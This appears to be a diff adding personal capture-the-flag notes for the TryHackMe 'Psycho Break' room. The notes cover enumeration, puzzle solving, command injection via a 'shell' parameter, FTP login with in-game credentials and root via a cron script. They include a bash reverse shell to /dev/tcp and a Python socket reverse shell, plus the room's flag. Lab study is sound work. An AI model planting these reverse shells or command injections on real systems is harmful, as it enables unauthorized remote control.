@@ -1,0 +1,209 @@
+nmap -sSVC -Pn -vv 10.10.32.247
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 62 ProFTPD 1.3.5a
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 44:2f:fb:3b:f3:95:c3:c6:df:31:d6:e0:9e:99:92:42 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDtgGI2Qpv+ora/iClEVeJSyw673ED4ciilMWv/Cw2NtVl9oB8A5rKktZYnJDw5sYZOvXimjb20Rk6a742anZZA87PM3StTZy8ZAMDEwdt8omaz5zy1c+HcJi4jjUIzPAZK10iKJ0JnyZ3eZZgEXALsU1zTi6U8Wn+6pixB9yRzAV8FVd/UThmC8vkiyNbNJUF6tgP+paajOIq2KzcmYrn8zZFL79EjDUUqSx72/wc/VUYyNArVGtVmOuvW1TBQwnpUv3zNQL1sabfiRzmgWB4unfHCVbj8autfHOfHSpMxC5QOuOJRTdhak6MUlHbjSXBF5MU1OP4mNTIoh/+e8k17
+|   256 92:24:36:91:7a:db:62:d2:b9:bb:43:eb:58:9b:50:14 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCE8pJD7f5qX4X2kInnJf/m5wbTLOFA3I49Hyi2MrHxg3jREHseTbpqk00Xmy7F2+8Z8ljTdJwD9aafUAPgXxes=
+|   256 34:04:df:13:54:21:8d:37:7f:f8:0a:65:93:47:75:d0 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPxHqNM/ISBztZhs47D+flKJiTqFqt5kJrFDoeNyO8Zb
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Welcome To Becon Mental Hospital
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+ffuf -u http://10.10.32.247/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,3002 -recursion
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.32.247/FUZZ -e .aspx,.html,.php,.txt -mc 200,302
+map.php
+
+view soure
+....
+<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->
+....
+
+http://10.10.32.247/sadistRoom
+-->ok
+532219a04ab7a02b56faafbec1a4c1ea
+
+Decode this piece of text "Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv" and get the key to access the map
+
+Click here to veiw the map ...
+
+
+Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv
+https://www.guballa.de/vigenere-solver
+
+Grant_me_access_to_the_map_please
+
+http://10.10.32.247/map.php
+choose
+http://10.10.32.247/SafeHeaven/
+
+ffuf -u http://10.10.32.247/SafeHeaven/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,302
+
+gobuster dir -u http://10.10.206.142/SafeHeaven/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt
+/index.php            (Status: 200) [Size: 1299]
+/imgs                 (Status: 301) [Size: 324] [--> http://10.10.206.142/SafeHeaven/imgs/]
+/keeper               (Status: 301) [Size: 326] [--> http://10.10.206.142/SafeHeaven/keeper/]
+
+<!--To Find it Add Reverse To Google-pyth->
+save image
+
+search image Google view
+
+St. Augustine Lighthouse
+
+
+
+http://10.10.206.142/SafeHeaven/8793579beba1cfcde0a5312790370eae.php
+
+
+http://10.10.206.142/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php
+
+<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->
+
+<!-- To find more about the Spider Lady visit https://theevilwithin.fandom.com/wiki/Laura_(Creature) -->
+
+
+http://10.10.206.142/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls
+
+https://theevilwithin.fandom.com/wiki/Laura_(Creature)
+
+
+view-source:http://10.10.206.142/abandonedRoom/be8bc662d1e36575a52da40beba38275/herecomeslara.php?shell=ls+..
+
+680e89809965ec41e64dc7e447f175ab
+be8bc662d1e36575a52da40beba38275
+index.php
+.....
+
+http://10.10.206.142/abandonedRoom/680e89809965ec41e64dc7e447f175ab/
+
+[ ]	helpme.zip	2020-07-09 13:52 	26K	 
+[TXT]	you_made_it.txt	2020-07-22 01:22 	62 	 
+
+
+unzip helpme.zip
+ls
+file Table.jpg 
+Table.jpg: Zip archive data, at least v2.0 to extract
+
+┌──(root💀who)-[/mnt/c/Users/whoami/Desktop/thm/PsychoBreak/helpme]
+└─# unzip Table.jpg 
+Archive:  Table.jpg
+  inflating: Joseph_Oda.jpg
+  inflating: key.wav
+
+ls
+helpme.txt  Joseph_Oda.jpg  key.wav  Table.jpg
+
+file key.wav listen like more 
+https://morsecode.world/international/decoder/audio-decoder-adaptive.html
+
+upload file key.wav
+--->SHOWME
+
+steghide extract -sf Joseph_Oda.jpg
+Enter passphrase: SHOWME
+
+wrote extracted data to "thankyou.txt".
+
+cat thankyou.txt 
+
+From joseph,
+
+Thank you so much for freeing me out of this cell. Ruvik is nor good, he told me that his going to kill sebastian and next would be me. You got to help
+Sebastian ... I think you might find Sebastian at the Victoriano Estate. This note I managed to grab from Ruvik might help you get inn to the Victoriano Estate.
+But for some reason there is my name listed on the note which I don't have a clue.
+
+           --------------------------------------------
+        //                                              \\
+        ||      (NOTE) FTP Details                      ||
+        ||      ==================                      ||
+        ||                                              ||
+        ||      USER : joseph                           ||
+        ||      PASSWORD : intotheterror445             ||
+        ||                                              ||
+        \\                                              //
+           --------------------------------------------
+
+
+Good luck, Be carefull !!!
+
+ftp 10.10.206.142
+Connected to 10.10.206.142.
+220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.206.142]
+Name (10.10.206.142:root): joseph
+331 Password required for joseph
+Password:
+230 User joseph logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+get program
+get random.dic
+
+justin => Incorrect
+
+killer => Incorrect
+
+kidman => Correct
+
+Well Done !!!
+Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
+
+https://www.dcode.fr/multitap-abc-cipher
+
+KIDMANSPASSWORDISSOSTRANGE
+
+find / -type f -perm -04000 -ls 2>/dev/null
+
+./LinEnum.sh
+*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
+
+vi .the_eye_of_ruvik.py
+
+subprocess.call("bash -c 'bash -i >& /dev/tcp/10.11.52.16/1234 0>&1'",shell=True)
+
+ncat -lnvp 1234
+whoami
+whoami
+root
+root@evilwithin:~# ls
+ls
+readMe.txt
+root.txt
+root@evilwithin:~# cat root.txt 
+cat root.txt
+BA33BDF5B8A3BFC431322F7D13F3361E
+root@evilwithin:~# cat readMe.txt
+cat readMe.txt
+
+
+ /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+|  From Sebastian :                                                                     |
+|                                                                                       |
+|  You have one final task ... Help me to defeat ruvik !!!                              |
+|                                                                                       |
+ \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+
+
+deluser --remove-home ruvik
+
+or  vi /var/.the_eye_of_ruvik.py
+subprocess.call("deluser --remove-all-files ruvik", shell=True)
+
+https://tryhackme.com/room/psychobreak
+https://niekdang.wordpress.com/2021/05/20/tryhackme-solution-psycho-break/
+https://0xnirvana.gitbook.io/writeups/tryhackme/easy/psycho-break
+
+trick:
+or add to python
+subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)
+import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1.1.1",1338));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh -i")
